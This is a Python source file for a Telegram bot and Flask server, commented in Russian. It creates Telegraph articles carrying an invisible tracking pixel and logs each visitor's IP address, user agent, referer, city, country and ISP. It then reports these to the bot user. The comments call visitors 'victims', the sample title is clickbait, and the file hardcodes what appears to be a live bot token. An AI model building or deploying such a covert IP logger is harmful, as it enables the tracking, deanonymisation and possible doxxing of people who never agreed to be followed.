import telebot
from flask import Flask, request
import requests
import sqlite3
import uuid
import threading
import time
import os
from datetime import datetime
import logging

# Настройки
BOT_TOKEN = "8594559077:AAFoKX-w7hpYDXkbHc3kTEcesO4vb5fW-nw"  # Вставь свой токен
ADMIN_CHAT_ID = 7462192673  # Вставь свой chat_id (узнай у @userinfobot)

# Твой домен или URL от хостинга (Koyeb/Render)
BASE_URL = "https://molecular-marnie-telepuziki-6932c5c9.koyeb.app"  # ЗАМЕНИ НА СВОЙ

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация бота
bot = telebot.TeleBot(BOT_TOKEN)

# Flask приложение для веб-сервера
app = Flask(__name__)

# База данных
conn = sqlite3.connect('logger.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS pages
             (hash TEXT PRIMARY KEY, 
              chat_id INTEGER, 
              title TEXT, 
              telegra_url TEXT,
              created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

c.execute('''CREATE TABLE IF NOT EXISTS visits
             (id INTEGER PRIMARY KEY AUTOINCREMENT, 
              page_hash TEXT, 
              ip TEXT, 
              user_agent TEXT, 
              country TEXT, 
              city TEXT, 
              provider TEXT,
              visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
conn.commit()

# Функция создания статьи в Telegraph
def create_telegraph_page(title, content, tracking_hash):
    """Создает статью в Telegraph с невидимым пикселем"""
    
    # URL пикселя на твоем сервере
    pixel_url = f"{BASE_URL}/pixel?hash={tracking_hash}"
    
    # Формируем контент для Telegraph
    content_nodes = []
    
    # Добавляем невидимый пиксель в начале
    content_nodes.append({
        "tag": "p",
        "children": [{
            "tag": "img",
            "attrs": {
                "src": pixel_url,
                "style": "display:none; width:0; height:0;"
            }
        }]
    })
    
    # Добавляем текст статьи (разбиваем по абзацам)
    for paragraph in content.split('\n'):
        if paragraph.strip():
            content_nodes.append({
                "tag": "p",
                "children": [paragraph.strip()]
            })
    
    # Отправляем запрос к Telegraph API
    try:
        response = requests.post('https://api.telegra.ph/createPage', json={
            'title': title[:255],
            'author_name': 'Anonymous',
            'content': content_nodes,
            'return_content': True
        }, timeout=10)
        
        if response.status_code == 200 and response.json()['ok']:
            return response.json()['result']['url']
        else:
            logger.error(f"Telegraph API error: {response.text}")
            return None
    except Exception as e:
        logger.error(f"Telegraph request failed: {e}")
        return None

# Команда /start
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, 
        "🔰 <b>Telegraph Logger Bot</b>\n\n"
        "Отправь мне текст в формате:\n"
        "<code>Заголовок | Текст статьи</code>\n\n"
        "Пример: <i>Секретные фото | Жми сюда быстрее!</i>",
        parse_mode='HTML'
    )

# Команда /stats
@bot.message_handler(commands=['stats'])
def stats(message):
    c.execute('SELECT COUNT(*) FROM pages WHERE chat_id = ?', (message.chat.id,))
    pages = c.fetchone()[0]
    
    c.execute('''SELECT COUNT(*) FROM visits v
                 JOIN pages p ON v.page_hash = p.hash
                 WHERE p.chat_id = ?''', (message.chat.id,))
    visits = c.fetchone()[0]
    
    bot.reply_to(message, 
        f"📊 <b>Твоя статистика</b>\n\n"
        f"📄 Создано страниц: {pages}\n"
        f"👁️ Всего переходов: {visits}",
        parse_mode='HTML'
    )

# Обработка текстовых сообщений
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    text = message.text
    
    # Проверяем формат
    if '|' not in text:
        bot.reply_to(message, 
            "❌ <b>Неправильный формат!</b>\n\n"
            "Используй: <code>Заголовок | Текст</code>",
            parse_mode='HTML'
        )
        return
    
    # Разделяем заголовок и текст
    title, content = text.split('|', 1)
    title = title.strip()
    content = content.strip()
    
    if not title or not content:
        bot.reply_to(message, "❌ Заголовок и текст не могут быть пустыми!")
        return
    
    # Отправляем статус
    msg = bot.reply_to(message, "⏳ Создаю статью...")
    
    # Генерируем уникальный hash для отслеживания
    page_hash = str(uuid.uuid4()).replace('-', '')[:14]
    
    try:
        # Создаем страницу в Telegraph
        page_url = create_telegraph_page(title, content, page_hash)
        
        if not page_url:
            bot.edit_message_text(
                "❌ Ошибка создания статьи. Попробуй позже.",
                msg.chat.id, msg.message_id
            )
            return
        
        # Сохраняем в базу данных
        c.execute('INSERT INTO pages (hash, chat_id, title, telegra_url) VALUES (?, ?, ?, ?)',
                  (page_hash, message.chat.id, title, page_url))
        conn.commit()
        
        # Отправляем результат
        bot.edit_message_text(
            f"✅ <b>Статья создана!</b>\n\n"
            f"📝 <b>Заголовок:</b> {title}\n"
            f"🔗 <b>Ссылка:</b> {page_url}\n\n"
            f"🆔 <b>Hash:</b> <code>{page_hash}</code>\n\n"
            f"<i>Когда кто-то откроет эту статью, я пришлю уведомление!</i>",
            msg.chat.id, msg.message_id,
            parse_mode='HTML'
        )
        
        # Уведомление админу (для отладки)
        bot.send_message(
            ADMIN_CHAT_ID,
            f"🔔 <b>Новая страница создана</b>\n"
            f"👤 {message.from_user.username or message.from_user.first_name}\n"
            f"🆔 {page_hash}\n"
            f"🔗 {page_url}",
            parse_mode='HTML'
        )
        
    except Exception as e:
        logger.error(f"Error: {e}")
        bot.edit_message_text(
            f"❌ Ошибка: {str(e)[:100]}",
            msg.chat.id, msg.message_id
        )

# ================= ВЕБ-СЕРВЕР ДЛЯ ПИКСЕЛЯ =================

def get_geo_info(ip):
    """Получает геоданные по IP через ip-api.com"""
    try:
        # Отсеиваем локальные IP
        if ip.startswith(('127.', '192.168.', '10.', '172.')):
            return {'country': 'Local', 'city': 'Local', 'provider': 'Local'}
        
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'provider': data.get('isp', data.get('org', 'Unknown'))
            }
    except Exception as e:
        logger.error(f"Geo error: {e}")
    
    return {'country': 'Unknown', 'city': 'Unknown', 'provider': 'Unknown'}

@app.route('/pixel')
def track_pixel():
    """Эндпоинт для невидимого пикселя - сюда стучатся жертвы"""
    
    tracking_hash = request.args.get('hash')
    
    if not tracking_hash:
        return '', 400
    
    # Получаем IP жертвы
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    # Получаем геолокацию
    geo = get_geo_info(ip)
    
    # Получаем информацию о странице из базы
    c.execute('SELECT chat_id, title FROM pages WHERE hash = ?', (tracking_hash,))
    page = c.fetchone()
    
    if page:
        chat_id, title = page
        
        # Сохраняем визит в базу
        c.execute('''INSERT INTO visits 
                     (page_hash, ip, user_agent, country, city, provider)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (tracking_hash, ip, user_agent, geo['country'], geo['city'], geo['provider']))
        conn.commit()
        
        # Формируем красивое уведомление
        notification = (
            f"🚨 <b>НОВЫЙ ПЕРЕХОД!</b>\n\n"
            f"📄 <b>Страница:</b> {title}\n"
            f"🆔 <b>Hash:</b> <code>{tracking_hash}</code>\n\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
            f"📍 <b>Страна:</b> {geo['country']}\n"
            f"🏙️ <b>Город:</b> {geo['city']}\n"
            f"📡 <b>Провайдер:</b> {geo['provider']}\n"
            f"📱 <b>User-Agent:</b> {user_agent[:100]}\n"
            f"🔗 <b>Referer:</b> {referer}\n"
            f"⏰ <b>Время:</b> {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
        )
        
        # Отправляем уведомление пользователю
        try:
            bot.send_message(chat_id, notification, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Failed to send notification: {e}")
    
    # Возвращаем прозрачный GIF 1x1 пиксель
    pixel_gif = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    return pixel_gif, 200, {'Content-Type': 'image/gif'}

@app.route('/stats/<hash>')
def view_stats(hash):
    """Страница со статистикой по конкретному хешу"""
    c.execute('SELECT title FROM pages WHERE hash = ?', (hash,))
    page = c.fetchone()
    
    if not page:
        return "Страница не найдена", 404
    
    c.execute('''SELECT ip, country, city, provider, user_agent, visited_at 
                 FROM visits WHERE page_hash = ? ORDER BY visited_at DESC''', (hash,))
    visits = c.fetchall()
    
    html = f"<h1>Статистика: {page[0]}</h1>"
    html += f"<p>Всего переходов: {len(visits)}</p>"
    html += "<table border='1'><tr><th>IP</th><th>Страна</th><th>Город</th><th>Провайдер</th><th>User-Agent</th><th>Время</th></tr>"
    
    for v in visits:
        html += f"<tr><td>{v[0]}</td><td>{v[1]}</td><td>{v[2]}</td><td>{v[3]}</td><td>{v[4][:50]}</td><td>{v[5]}</td></tr>"
    
    html += "</table>"
    return html

@app.route('/health')
def health():
    return {"status": "ok", "time": datetime.now().isoformat()}

# Запуск бота в отдельном потоке
def run_bot():
    while True:
        try:
            logger.info("Starting bot polling...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            time.sleep(5)

# Запускаем бота в фоне
threading.Thread(target=run_bot, daemon=True).start()

# Запуск Flask
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
